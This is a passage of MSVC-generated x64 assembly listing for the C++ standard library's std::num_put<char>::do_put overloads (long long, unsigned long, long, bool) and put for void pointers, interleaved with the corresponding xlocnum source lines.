?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_K@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_J@Z
_TEXT	SEGMENT
$T1 = 64
_Fmt$ = 80
_Buf$ = 96
__$ArrayPad$ = 160
this$ = 208
__$ReturnUdt$ = 216
_Dest$ = 224
_Iosbase$ = 232
_Fill$ = 240
_Val$ = 248
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_J@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put, COMDAT

; 1294 :         _OutIt _Dest, ios_base& _Iosbase, _Elem _Fill, long long _Val) const { // put formatted long long to _Dest

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 184				; 000000b8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 1295 :         char _Buf[2 * _MAX_INT_DIG];
; 1296 :         char _Fmt[8];
; 1297 : 
; 1298 :         return _Iput(_Dest, _Iosbase, _Fill, _Buf,

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	mov	r9d, eax
	lea	r8, OFFSET FLAT:??_C@_02HIKPPMOK@Ld@
	lea	rdx, QWORD PTR _Fmt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Ifmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADPEBDH@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ifmt
	mov	r9, QWORD PTR _Val$[rsp]
	mov	r8, rax
	mov	edx, 64					; 00000040H
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	sprintf_s
	cdqe
	lea	rcx, QWORD PTR $T1[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	QWORD PTR [rsp+48], rax
	lea	rax, QWORD PTR _Buf$[rsp]
	mov	QWORD PTR [rsp+40], rax
	movzx	eax, BYTE PTR _Fill$[rsp]
	mov	BYTE PTR [rsp+32], al
	mov	r9, QWORD PTR _Iosbase$[rsp]
	lea	r8, QWORD PTR $T1[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1299 :             static_cast<size_t>(_CSTD sprintf_s(_Buf, sizeof(_Buf), _Ifmt(_Fmt, "Ld", _Iosbase.flags()), _Val)));
; 1300 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 184				; 000000b8H
	pop	rdi
	pop	rsi
	ret	0
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_J@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DK@Z
_TEXT	SEGMENT
$T1 = 64
_Fmt$ = 80
_Buf$ = 96
__$ArrayPad$ = 160
this$ = 208
__$ReturnUdt$ = 216
_Dest$ = 224
_Iosbase$ = 232
_Fill$ = 240
_Val$ = 248
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DK@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put, COMDAT

; 1285 :         unsigned long _Val) const { // put formatted unsigned long to _Dest

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 184				; 000000b8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 1286 :         char _Buf[2 * _MAX_INT_DIG];
; 1287 :         char _Fmt[6];
; 1288 : 
; 1289 :         return _Iput(_Dest, _Iosbase, _Fill, _Buf,

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	mov	r9d, eax
	lea	r8, OFFSET FLAT:??_C@_02BDDLJJBK@lu@
	lea	rdx, QWORD PTR _Fmt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Ifmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADPEBDH@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ifmt
	mov	r9d, DWORD PTR _Val$[rsp]
	mov	r8, rax
	mov	edx, 64					; 00000040H
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	sprintf_s
	cdqe
	lea	rcx, QWORD PTR $T1[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	QWORD PTR [rsp+48], rax
	lea	rax, QWORD PTR _Buf$[rsp]
	mov	QWORD PTR [rsp+40], rax
	movzx	eax, BYTE PTR _Fill$[rsp]
	mov	BYTE PTR [rsp+32], al
	mov	r9, QWORD PTR _Iosbase$[rsp]
	lea	r8, QWORD PTR $T1[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1290 :             static_cast<size_t>(_CSTD sprintf_s(_Buf, sizeof(_Buf), _Ifmt(_Fmt, "lu", _Iosbase.flags()), _Val)));
; 1291 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 184				; 000000b8H
	pop	rdi
	pop	rsi
	ret	0
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DK@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z
_TEXT	SEGMENT
$T1 = 64
_Fmt$ = 80
_Buf$ = 96
__$ArrayPad$ = 160
this$ = 208
__$ReturnUdt$ = 216
_Dest$ = 224
_Iosbase$ = 232
_Fill$ = 240
_Val$ = 248
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put, COMDAT

; 1276 :         _OutIt _Dest, ios_base& _Iosbase, _Elem _Fill, long _Val) const { // put formatted long to _Dest

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 184				; 000000b8H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 1277 :         char _Buf[2 * _MAX_INT_DIG];
; 1278 :         char _Fmt[6];
; 1279 : 
; 1280 :         return _Iput(_Dest, _Iosbase, _Fill, _Buf,

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	mov	r9d, eax
	lea	r8, OFFSET FLAT:??_C@_02EAOCLKAK@ld@
	lea	rdx, QWORD PTR _Fmt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Ifmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADPEBDH@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ifmt
	mov	r9d, DWORD PTR _Val$[rsp]
	mov	r8, rax
	mov	edx, 64					; 00000040H
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	sprintf_s
	cdqe
	lea	rcx, QWORD PTR $T1[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	QWORD PTR [rsp+48], rax
	lea	rax, QWORD PTR _Buf$[rsp]
	mov	QWORD PTR [rsp+40], rax
	movzx	eax, BYTE PTR _Fill$[rsp]
	mov	BYTE PTR [rsp+32], al
	mov	r9, QWORD PTR _Iosbase$[rsp]
	lea	r8, QWORD PTR $T1[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1281 :             static_cast<size_t>(_CSTD sprintf_s(_Buf, sizeof(_Buf), _Ifmt(_Fmt, "ld", _Iosbase.flags()), _Val)));
; 1282 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 184				; 000000b8H
	pop	rdi
	pop	rsi
	ret	0
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z
_TEXT	SEGMENT
_Fillcount$1 = 48
_Punct_fac$2 = 56
tv85 = 64
tv185 = 72
tv178 = 80
tv181 = 88
tv183 = 96
tv139 = 104
tv144 = 112
tv162 = 120
$T3 = 128
$T4 = 144
$T5 = 160
$T6 = 176
$T7 = 192
$T8 = 208
$T9 = 224
_Str$10 = 240
$T11 = 272
$T12 = 304
__$ArrayPad$ = 336
this$ = 384
__$ReturnUdt$ = 392
_Dest$ = 400
_Iosbase$ = 408
_Fill$ = 416
_Val$ = 424
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put, COMDAT

; 1244 :         _OutIt _Dest, ios_base& _Iosbase, _Elem _Fill, bool _Val) const { // put formatted bool to _Dest

$LN15:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 360				; 00000168H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 1245 :         if (!(_Iosbase.flags() & ios_base::boolalpha)) {

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	and	eax, 16384				; 00004000H
	test	eax, eax
	jne	SHORT $LN2@do_put

; 1246 :             return do_put(_Dest, _Iosbase, _Fill, static_cast<long>(_Val));

	movzx	eax, BYTE PTR _Val$[rsp]
	lea	rcx, QWORD PTR $T3[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	QWORD PTR tv85[rsp], rcx
	mov	DWORD PTR [rsp+40], eax
	movzx	eax, BYTE PTR _Fill$[rsp]
	mov	BYTE PTR [rsp+32], al
	mov	r9, QWORD PTR _Iosbase$[rsp]
	lea	r8, QWORD PTR $T3[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR tv85[rsp]
	call	QWORD PTR [rax+72]
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]
	jmp	$LN1@do_put

; 1247 :         } else { // put "false" or "true"

	jmp	$LN1@do_put
$LN2@do_put:

; 1248 :             const auto& _Punct_fac = _STD use_facet<numpunct<_Elem>>(_Iosbase.getloc());

	lea	rdx, QWORD PTR $T4[rsp]
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?getloc@ios_base@std@@QEBA?AVlocale@2@XZ ; std::ios_base::getloc
	mov	QWORD PTR tv185[rsp], rax
	mov	rax, QWORD PTR tv185[rsp]
	mov	QWORD PTR tv178[rsp], rax
	mov	rcx, QWORD PTR tv178[rsp]
	call	??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z ; std::use_facet<std::numpunct<char> >
	mov	QWORD PTR _Punct_fac$2[rsp], rax
	lea	rcx, QWORD PTR $T4[rsp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale

; 1249 :             basic_string<_Elem> _Str;

	lea	rcx, QWORD PTR _Str$10[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1

; 1250 :             if (_Val) {

	movzx	eax, BYTE PTR _Val$[rsp]
	test	eax, eax
	je	SHORT $LN4@do_put

; 1251 :                 _Str.assign(_Punct_fac.truename());

	lea	rdx, QWORD PTR $T11[rsp]
	mov	rcx, QWORD PTR _Punct_fac$2[rsp]
	call	?truename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::numpunct<char>::truename
	mov	QWORD PTR tv181[rsp], rax
	mov	rdx, QWORD PTR tv181[rsp]
	lea	rcx, QWORD PTR _Str$10[rsp]
	call	?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@$$QEAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::assign
	lea	rcx, QWORD PTR $T11[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >

; 1252 :             } else {

	jmp	SHORT $LN5@do_put
$LN4@do_put:

; 1253 :                 _Str.assign(_Punct_fac.falsename());

	lea	rdx, QWORD PTR $T12[rsp]
	mov	rcx, QWORD PTR _Punct_fac$2[rsp]
	call	?falsename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::numpunct<char>::falsename
	mov	QWORD PTR tv183[rsp], rax
	mov	rdx, QWORD PTR tv183[rsp]
	lea	rcx, QWORD PTR _Str$10[rsp]
	call	?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV12@$$QEAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::assign
	lea	rcx, QWORD PTR $T12[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
$LN5@do_put:

; 1254 :             }
; 1255 : 
; 1256 :             size_t _Fillcount;
; 1257 :             if (_Iosbase.width() <= 0 || static_cast<size_t>(_Iosbase.width()) <= _Str.size()) {

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	test	rax, rax
	jle	SHORT $LN8@do_put
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	mov	QWORD PTR tv139[rsp], rax
	lea	rcx, QWORD PTR _Str$10[rsp]
	call	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
	mov	rcx, QWORD PTR tv139[rsp]
	cmp	rcx, rax
	ja	SHORT $LN6@do_put
$LN8@do_put:

; 1258 :                 _Fillcount = 0;

	mov	QWORD PTR _Fillcount$1[rsp], 0

; 1259 :             } else {

	jmp	SHORT $LN7@do_put
$LN6@do_put:

; 1260 :                 _Fillcount = static_cast<size_t>(_Iosbase.width()) - _Str.size();

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEBA_JXZ		; std::ios_base::width
	mov	QWORD PTR tv144[rsp], rax
	lea	rcx, QWORD PTR _Str$10[rsp]
	call	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
	mov	rcx, QWORD PTR tv144[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Fillcount$1[rsp], rax
$LN7@do_put:

; 1261 :             }
; 1262 : 
; 1263 :             if ((_Iosbase.flags() & ios_base::adjustfield) != ios_base::left) { // put leading fill

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	and	eax, 448				; 000001c0H
	cmp	eax, 64					; 00000040H
	je	SHORT $LN9@do_put

; 1264 :                 _Dest      = _Rep(_Dest, _Fill, _Fillcount);

	lea	rax, QWORD PTR $T5[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR _Fillcount$1[rsp]
	mov	QWORD PTR [rsp+32], rax
	movzx	r9d, BYTE PTR _Fill$[rsp]
	lea	r8, QWORD PTR $T5[rsp]
	lea	rdx, QWORD PTR $T8[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Rep
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb

; 1265 :                 _Fillcount = 0;

	mov	QWORD PTR _Fillcount$1[rsp], 0
$LN9@do_put:

; 1266 :             }
; 1267 :             _Dest = _Put(_Dest, _Str.c_str(), _Str.size()); // put field

	lea	rcx, QWORD PTR _Str$10[rsp]
	call	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
	mov	QWORD PTR tv162[rsp], rax
	lea	rcx, QWORD PTR _Str$10[rsp]
	call	?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBAPEBDXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::c_str
	lea	rcx, QWORD PTR $T6[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR tv162[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, rax
	lea	r8, QWORD PTR $T6[rsp]
	lea	rdx, QWORD PTR $T9[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb

; 1268 :             _Iosbase.width(0);

	xor	edx, edx
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEAA_J_J@Z		; std::ios_base::width

; 1269 :             return _Rep(_Dest, _Fill, _Fillcount); // put trailing fill

	lea	rax, QWORD PTR $T7[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR _Fillcount$1[rsp]
	mov	QWORD PTR [rsp+32], rax
	movzx	r9d, BYTE PTR _Fill$[rsp]
	lea	r8, QWORD PTR $T7[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Rep
	npad	1
	lea	rcx, QWORD PTR _Str$10[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]
$LN1@do_put:

; 1270 :         }
; 1271 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 360				; 00000168H
	pop	rdi
	pop	rsi
	ret	0
?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Fillcount$1 = 48
_Punct_fac$2 = 56
tv85 = 64
tv185 = 72
tv178 = 80
tv181 = 88
tv183 = 96
tv139 = 104
tv144 = 112
tv162 = 120
$T3 = 128
$T4 = 144
$T5 = 160
$T6 = 176
$T7 = 192
$T8 = 208
$T9 = 224
_Str$10 = 240
$T11 = 272
$T12 = 304
__$ArrayPad$ = 336
this$ = 384
__$ReturnUdt$ = 392
_Dest$ = 400
_Iosbase$ = 408
_Fill$ = 416
_Val$ = 424
?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T4[rbp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Fillcount$1 = 48
_Punct_fac$2 = 56
tv85 = 64
tv185 = 72
tv178 = 80
tv181 = 88
tv183 = 96
tv139 = 104
tv144 = 112
tv162 = 120
$T3 = 128
$T4 = 144
$T5 = 160
$T6 = 176
$T7 = 192
$T8 = 208
$T9 = 224
_Str$10 = 240
$T11 = 272
$T12 = 304
__$ArrayPad$ = 336
this$ = 384
__$ReturnUdt$ = 392
_Dest$ = 400
_Iosbase$ = 408
_Fill$ = 416
_Val$ = 424
?dtor$1@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Str$10[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0??do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_N@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z
_TEXT	SEGMENT
$T1 = 48
this$ = 96
__$ReturnUdt$ = 104
_Dest$ = 112
_Iosbase$ = 120
_Fill$ = 128
_Val$ = 136
?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::put, COMDAT

; 1238 :         _OutIt _Dest, ios_base& _Iosbase, _Elem _Fill, const void* _Val) const { // put formatted void pointer to _Dest

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 72					; 00000048H

; 1239 :         return do_put(_Dest, _Iosbase, _Fill, _Val);

	lea	rax, QWORD PTR $T1[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Val$[rsp]
	mov	QWORD PTR [rsp+40], rcx
	movzx	ecx, BYTE PTR _Fill$[rsp]
	mov	BYTE PTR [rsp+32], cl
	mov	r9, QWORD PTR _Iosbase$[rsp]
	lea	r8, QWORD PTR $T1[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+24]
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1240 :     }

	add	rsp, 72					; 00000048H
	pop	rdi
